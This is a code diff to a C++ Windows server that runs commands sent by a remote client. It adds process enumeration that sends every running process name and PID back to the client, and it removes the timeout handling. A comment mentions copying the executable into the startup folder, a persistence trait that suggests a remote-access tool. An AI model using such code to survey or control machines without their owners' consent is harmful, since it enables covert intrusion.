@@ -33,9 +33,6 @@ int Server::handleCommand(char* command) {
             if (res == -1) {
                 handleError("copy_from");
             }
-            else if (res == -2) { // Time out return
-                handleTimeout();
-            }
             return 0;
         }
         else if (strcmp(command, "exit") == 0) {
@@ -217,6 +214,12 @@ int Server::handleCommand(char* command) {
             shiftStrLeft(command, 4);
             if (handleCutCommand(command) == -1) {
                 handleError("cut");
+            }
+            return 0;
+        }
+        else if (strncmp(command, "get-processes", strlen("get-processes")) == 0) {
+            if(handleGetProcesses() == -1) {
+                handleError("get-processes");
             }
             return 0;
         }
@@ -1225,22 +1228,6 @@ int Server::handleCopyFromCommand(char* command) {
     return 0;
 }
 
-/**
- * @brief Handles the timeout event by sending a failure message to the client.
- *
- * @details
- * This function is invoked when the server receives a timeout event. It sends a failure message
- * to the client indicating that their request has timed out. The failure message is logged to the
- * log file and printed to the standard error output. The message is then sent to the client using
- * the ClientSocket. If the send operation encounters an error, an exception is thrown.
- */
-void Server::handleTimeout() {
-    std::string sendFail = "Your request timed out!";
-
-    if (handleSend(sendFail, LastSock) == -1)
-        throw std::runtime_error("Couldn't send message!");
-}
-
 
 /**
  * @brief Starts the process to move the executable to the startup folder and sends a confirmation message to the client.
@@ -1864,6 +1851,70 @@ int Server::handleCutCommand(char* command) {
         std::string success = std::format("Successfully cut {}", command);
         std::cout << success << std::endl;
         log << success << std::endl;
+    }
+
+    return 0;
+}
+
+/**
+ * @brief Retrieves the name and ID of a specified process.
+ *
+ * @param processID The ID of the process.
+ * @return Returns a string containing the process name and ID.
+ */
+std::string getProcessNameAndID(DWORD processID) {
+    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+                                  FALSE, processID);
+    std::string ret;
+
+    if(hProcess != NULL) {
+        HMODULE hMod;
+        DWORD cbNeeded;
+
+        if(EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
+            GetModuleBaseName(hProcess, hMod, szProcessName,
+                              sizeof(szProcessName) / sizeof(TCHAR));
+        }
+    }
+#if defined(UNICODE) || defined(_UNICODE)
+    std::wstring wStr = szProcessName;
+    std::string str(wStr.begin(), wStr.end());
+    ret = std::format("{}  (PID: {})\n", str, processID);
+#else
+    ret = std::format("{}  (PID: {})\n", szProcessName, processID);
+#endif
+    CloseHandle(hProcess);
+
+    return ret;
+}
+
+/**
+ * @brief Handles the GET_PROCESSES command.
+ *
+ * @details
+ * This function handles the GET_PROCESSES command by retrieving the names and IDs of all running processes
+ * on the server and sending the information to the client.
+ *
+ * @return 0 on success, -1 on failure to send the process information.
+ */
+int Server::handleGetProcesses() {
+    DWORD aProcesses[1024], cbNeeded, cProcesses;
+    std::string processNamesAndIDs;
+
+    if(!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
+        return -1;
+    }
+
+    cProcesses = cbNeeded / sizeof(DWORD);
+    for(int i = 0; i < cProcesses; i++) {
+        if(aProcesses[i] != 0) {
+            processNamesAndIDs += getProcessNameAndID(aProcesses[i]);
+        }
+    }
+
+    if(handleSend(processNamesAndIDs, LastSock) != 0) {
+        return -1;
     }
 
     return 0;
